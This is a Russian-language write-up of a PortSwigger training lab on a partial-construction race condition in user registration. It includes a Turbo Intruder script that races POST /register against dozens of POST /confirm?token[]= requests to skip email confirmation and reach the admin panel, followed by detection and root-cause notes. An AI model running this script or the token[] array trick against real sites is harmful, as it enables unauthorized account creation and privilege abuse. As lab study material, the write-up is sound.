# Partial construction: регистрация с null-токеном

**Лаба:** [Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) (Expert, Race conditions)
**Суть:** между созданием пользователя и записью токена подтверждения в БД есть окно, в котором токен ещё `null`. Если в этот момент проходит проверка токена, можно обойти подтверждение почты.

## Разведка

Для регистрации нужен адрес в домене `@ginandjuice.shop`, к почте в котором у нас нет доступа. Завершается регистрация подтверждением токена из письма. В `users.js` виден запрос подтверждения: `POST /confirm?token=...`. Проверяем варианты токена:

- `?token=1` → `Incorrect token`
- без параметра → `Missing parameter`
- `?token=` (пустой) → `Forbidden` — пустая строка явно запрещена
- `?token[]=` (массив с пустым элементом) → `Invalid token: Array` — параметр распознан как массив и не отклонён проверкой пустой строки

Различие ответов на пустую строку и массив подсказывает, где искать обход проверки. Если запись пользователя создаётся до записи токена, можно попробовать попасть в промежуточное состояние, где токен ещё `null`. Одних этих ответов недостаточно, чтобы подтвердить гонку.

## Гонка

В Turbo Intruder используем шаблон single-packet attack: 20 попыток, в каждой один POST /register (новый username, email `@ginandjuice.shop`) и 50 POST /confirm?token[]= с одним значением gate. При открытии gate запросы отправляются одновременно:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    confirm = '''POST /confirm?token[]= HTTP/2
Host: LAB
Cookie: phpsessionid=SESSION
Content-Length: 0

'''
    for attempt in range(20):
        gate = str(attempt)
        engine.queue(target.req, 'User' + gate, gate=gate)
        for i in range(50):
            engine.queue(confirm, gate=gate)
        engine.openGate(gate)
```

Сортируем результаты по длине: среди ответов на confirm есть 200 с «Account registration successful». Входим под соответствующим пользователем, открываем панель администратора и удаляем carlos.

## Как обнаружить

Для этой лабы подозрителен `token[]` в URL: штатный клиент передаёт строку, а не массив. Серверу стоит проверять тип параметра, но такая проверка сама по себе не устраняет гонку. В журналах можно искать серию POST /register и десятки POST /confirm с одного источника за короткий промежуток времени.

## Заметка

Проблема в промежуточном состоянии записи: пользователь уже существует, а токен ещё не записан. Запрет пустой строки не закрывает это окно. Подтверждение не должно работать для записи без корректно сформированного токена.
